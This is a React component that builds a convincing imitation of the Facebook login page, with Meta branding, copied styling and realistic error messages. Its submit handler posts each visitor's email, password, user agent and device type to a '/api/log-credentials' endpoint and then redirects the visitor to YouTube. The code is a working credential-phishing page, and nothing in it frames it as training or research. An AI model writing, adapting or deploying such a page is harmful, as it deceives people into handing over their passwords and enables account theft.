import { useState, useEffect } from 'react';

export default function FacebookLogin() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
    };
    checkMobile();
  }, []);

  const validateCredentials = (email, password) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\d{10}$/;
    const cleanEmail = email.replace(/\D/g, '');
    
    if (!emailRegex.test(email) && !phoneRegex.test(cleanEmail)) {
      return "The email or mobile number you entered isn't connected to an account. Find your account and log in.";
    }
    
    const weakPasswords = ['123456', 'password', 'qqqqqq', 'wwwwww', 'aaaaaa', '111111', '000000'];
    if (password.length < 6) return "The password you entered is incorrect. Please try again.";
    if (weakPasswords.includes(password.toLowerCase())) return "The password you entered is incorrect. Please try again.";
    if (/(.)\1{5,}/.test(password)) return "The password you entered is incorrect. Please try again.";
    
    return null;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    const validationError = validateCredentials(email, password);
    if (validationError) {
      setError(validationError);
      return;
    }

    try {
      await fetch('/api/log-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          email, 
          password, 
          userAgent: navigator.userAgent,
          deviceType: isMobile ? 'mobile' : 'desktop'
        })
      });

      window.location.href = `https://www.youtube.com/results?search_query=yoah+bros`;
      
    } catch (err) {
      setError('Invalid username or password');
    }
  };

  return (
    <div className="facebook-container">
      <div className="facebook-header">
        <div className="logo-section">
          <div className="facebook-logo">facebook</div>
        </div>
      </div>
      
      <div className="main-content">
        <div className="login-container">
          <div className="login-box">
            <div className="login-header">
              <h2>Log in to Facebook</h2>
            </div>
            
            <form onSubmit={handleSubmit} className="login-form">
              {error && (
                <div className="error-message">
                  <div className="error-icon">!</div>
                  <div className="error-text">{error}</div>
                </div>
              )}
              
              <div className="input-container">
                <input
                  type="text"
                  placeholder="Email or phone number"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  className="facebook-input"
                  inputMode="email"
                />
              </div>
              
              <div className="input-container">
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  className="facebook-input"
                />
              </div>

              <button type="submit" className="login-button">
                Log In
              </button>
              
              <div className="separator"></div>
              
              <div className="secondary-actions">
                <a href="#" className="forgot-password">Forgotten password?</a>
                <a href="#" className="create-account">Create new account</a>
              </div>
            </form>
          </div>
          
          <div className="language-footer">
            <div className="languages">
              <a href="#">English (UK)</a>
              <a href="#">Español</a>
              <a href="#">Français (France)</a>
              <a href="#">Português (Brasil)</a>
              <a href="#">Italiano</a>
              <a href="#">Deutsch</a>
              <a href="#">العربية</a>
              <a href="#">हिन्दी</a>
              <a href="#">中文(简体)</a>
              <a href="#">日本語</a>
            </div>
            <div className="meta">Meta © 2024</div>
          </div>
        </div>
      </div>

      <style jsx>{`
        .facebook-container {
          background: #f0f2f5;
          min-height: 100vh;
          font-family: Helvetica, Arial, sans-serif;
          margin: 0;
          padding: 0;
        }
        
        .facebook-header {
          background: #ffffff;
          padding: 16px 0;
          border-bottom: none;
          box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
        }
        
        .logo-section {
          max-width: 980px;
          margin: 0 auto;
          padding: 0 16px;
        }
        
        .facebook-logo {
          font-size: 28px;
          font-weight: bold;
          color: #1877f2;
          letter-spacing: -0.5px;
        }
        
        .main-content {
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: calc(100vh - 60px);
          padding: 20px 16px;
        }
        
        .login-container {
          max-width: 396px;
          width: 100%;
        }
        
        .login-box {
          background: #ffffff;
          border-radius: 8px;
          box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
          padding: 16px;
          margin-bottom: 28px;
          width: 100%;
          box-sizing: border-box;
        }
        
        .login-header {
          text-align: center;
          margin-bottom: 16px;
        }
        
        .login-header h2 {
          font-size: 18px;
          color: #1c1e21;
          font-weight: normal;
          margin: 0;
          line-height: 22px;
        }
        
        .login-form {
          display: flex;
          flex-direction: column;
          gap: 12px;
          width: 100%;
        }
        
        .input-container {
          margin-bottom: 12px;
          width: 100%;
        }
        
        .facebook-input {
          width: 100%;
          padding: 14px 16px;
          border: 1px solid #dddfe2;
          border-radius: 6px;
          font-size: 17px;
          background: #f5f6f7;
          box-sizing: border-box;
          min-height: 44px;
          color: #1c1e21;
          display: block;
        }
        
        .facebook-input:focus {
          border-color: #1877f2;
          outline: none;
          background: #ffffff;
        }
        
        .facebook-input::placeholder {
          color: #8a8d91;
        }
        
        .login-button {
          width: 100%;
          background: #1877f2;
          color: white;
          border: none;
          border-radius: 6px;
          padding: 12px;
          font-size: 20px;
          font-weight: bold;
          cursor: pointer;
          min-height: 48px;
          margin-bottom: 16px;
          display: block;
        }
        
        .login-button:hover {
          background: #166fe5;
        }
        
        .separator {
          border-bottom: 1px solid #dadde1;
          margin: 20px 0;
          width: 100%;
        }
        
        .secondary-actions {
          text-align: center;
          width: 100%;
        }
        
        .forgot-password {
          color: #1877f2;
          text-decoration: none;
          font-size: 14px;
          display: block;
          margin-bottom: 16px;
        }
        
        .forgot-password:hover {
          text-decoration: underline;
        }
        
        .create-account {
          display: inline-block;
          background: #42b72a;
          color: white;
          text-decoration: none;
          padding: 12px 16px;
          border-radius: 6px;
          font-size: 17px;
          font-weight: bold;
          margin-top: 8px;
        }
        
        .create-account:hover {
          background: #36a420;
        }
        
        .error-message {
          background: #ffebe8;
          border: 1px solid #dd3c10;
          border-radius: 6px;
          padding: 12px;
          display: flex;
          align-items: flex-start;
          gap: 8px;
          margin-bottom: 16px;
          width: 100%;
          box-sizing: border-box;
        }
        
        .error-icon {
          color: #dd3c10;
          font-weight: bold;
          font-size: 16px;
          flex-shrink: 0;
        }
        
        .error-text {
          color: #dd3c10;
          font-size: 14px;
          line-height: 1.4;
          flex: 1;
        }
        
        .language-footer {
          text-align: center;
          margin-top: 28px;
          width: 100%;
        }
        
        .languages {
          display: flex;
          flex-wrap: wrap;
          justify-content: center;
          gap: 8px;
          margin-bottom: 16px;
          font-size: 12px;
          max-width: 100%;
        }
        
        .languages a {
          color: #8a8d91;
          text-decoration: none;
          white-space: nowrap;
        }
        
        .languages a:hover {
          text-decoration: underline;
        }
        
        .meta {
          color: #8a8d91;
          font-size: 11px;
        }
        
        /* Mobile-specific styles */
        @media (max-width: 768px) {
          .facebook-container {
            background: #ffffff;
          }
          
          .facebook-header {
            background: #ffffff;
            padding: 12px 0;
          }
          
          .main-content {
            align-items: flex-start;
            padding-top: 40px;
          }
          
          .login-box {
            box-shadow: none;
            border: 1px solid #dddfe2;
            padding: 16px;
            margin: 0 auto;
            max-width: 400px;
          }
          
          .languages {
            gap: 6px;
          }
          
          .languages a {
            font-size: 11px;
          }
        }
        
        @media (max-width: 480px) {
          .login-box {
            padding: 12px;
            margin: 0 8px;
          }
          
          .facebook-input {
            padding: 12px 14px;
            font-size: 16px;
          }
          
          .languages {
            gap: 4px;
          }
          
          .languages a {
            font-size: 10px;
          }
        }
      `}</style>
    </div>
  );
}
